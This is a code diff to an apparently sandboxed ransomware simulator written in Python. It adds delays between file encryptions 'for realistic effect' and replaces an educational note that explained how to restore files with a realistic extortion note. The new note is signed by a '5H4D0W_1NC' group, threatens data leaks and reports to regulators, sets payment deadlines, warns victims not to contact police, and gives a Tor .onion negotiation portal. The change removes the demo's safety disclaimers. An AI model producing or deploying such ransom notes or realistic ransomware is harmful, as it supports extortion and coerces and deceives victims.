@@ -15,6 +15,7 @@ from __future__ import annotations
 import argparse
 import os
 import ctypes
+import time
 from datetime import datetime
 from pathlib import Path
 
@@ -384,9 +385,11 @@ def run_bulk_operation(mode: str, key_path: Path) -> None:
             if mode == "encrypt" and file_path.suffix != ENCRYPTED_EXT:
                 encrypt_file_hybrid(file_path, key_path)
                 set_file_association()
+                time.sleep(0.75)  # Delay between files for realistic effect                
             elif mode == "decrypt" and file_path.suffix == ENCRYPTED_EXT:
                 decrypt_file_hybrid(file_path, key_path)
                 remove_file_association()
+                time.sleep(0.75)  # Delay between files for realistic effect  
         except Exception as e:
             log(f"Failed processing {file_path.name}: {e}")
 
@@ -403,16 +406,56 @@ def create_ransom_note() -> None:
     validate_sandbox()
     note_file = SANDBOX_PATH / "note.txt"
     content = (
-        "RansomWhere Encryption Lab - Educational Demo\n"
-        "================================================\n\n"
-        "Your files have been encrypted for demonstration purposes.\n\n"
-        "This is a SAFE, SANDBOX-ONLY educational simulation.\n"
-        "No actual damage has been done to your system.\n\n"
-        "Encryption Method: AES-256-GCM + RSA-2048 OAEP\n"
-        "Public Key Location: " + str(PUBLIC_KEY_PATH) + "\n"
-        "All encrypted files end with: .hyenc\n\n"
-        "To restore files, use: python safe_ransomware_sim2.py decrypt --file <filename>\n"
-    )
+    "::: 5H4D0W_1NC LOCKER ::: \n"
+    "\n"
+    "!!! ALL YOUR FILES ARE ENCRYPTED !!!\n"
+    "\n"
+    "Hello,\n"
+    "\n"
+    "If you are reading this message, it means your company's network has been breached \n"
+    "and all your data has been encrypted by \"5H4D0W_1NC\" group. \n"
+    "\n"
+    "WHAT HAPPENED?\n"
+    "We have exploited vulnerabilities in your network infrastructure. All your servers, \n"
+    "databases, and backups have been locked with military-grade encryption algorithms \n"
+    "(AES-256 & RSA-2048). You cannot recover your files without our private key.\n"
+    "\n"
+    "DATA LEAK WARNING:\n"
+    "Before encryption, we downloaded your confidential data . If you refuse to pay or do not contact us, this \n"
+    "data will be published on our Tor blog for your competitors and regulators to see. \n"
+    "\n"
+    "HOW TO GET YOUR FILES BACK?\n"
+    "We are not interested in destroying your business, we only want payment.\n"
+    "You must purchase a unique decryption tool from us.\n"
+    "\n"
+    ">>> LEGAL & REPUTATION NOTICE (IMPORTANT):\n"
+    "We have analyzed your files If you do not pay:\n"
+    "1. We will send copies of this incriminating data directly to your GOVERNMENT \n"
+    "   agencies and regulators to trigger an investigation against you.\n"
+    "2. We will email your clients, business partners, and everyone in your CONTACT \n"
+    "   LIST to inform them that you lost their data.\n"
+    "\n"
+    "INSTRUCTIONS:\n"
+    "1. Download and install Tor Browser: https://www.torproject.org/\n"
+    "2. Open Tor Browser and navigate to our chat portal:\n"
+    "   http://oaptxiyisljt2kv3we2we34kuudmqda7f2geffoylzpeo7ourhtz4dad.onion/login.php\n"
+    "3. Enter your Personal ID to start the negotiation\n"
+    "(If the website is down or inaccessible, please try again after some time.)\n"
+    "\n"
+    "Your Personal ID:\n"
+    "[snip]-shadow-KEY\n"
+    "\n"
+    "DEADLINE:\n"
+    "You have 24 hours to contact us. After this, the price will double.\n"
+    "If we do not hear from you within 48 hours, your data will be leaked permanently.\n"
+    "\n"
+    "ATTENTION:\n"
+    "- Do not rename encrypted files.\n"
+    "- Do not try to decrypt using third-party software (you may lose data forever).\n"
+    "- Do not call the police or FBI (we will leak data immediately).\n"
+    "\n"
+    "-- 5H4D0W_1NC Team --\n"
+)
     try:
         note_file.write_text(content, encoding="utf-8")
         log(f"Created ransom note: {note_file}")
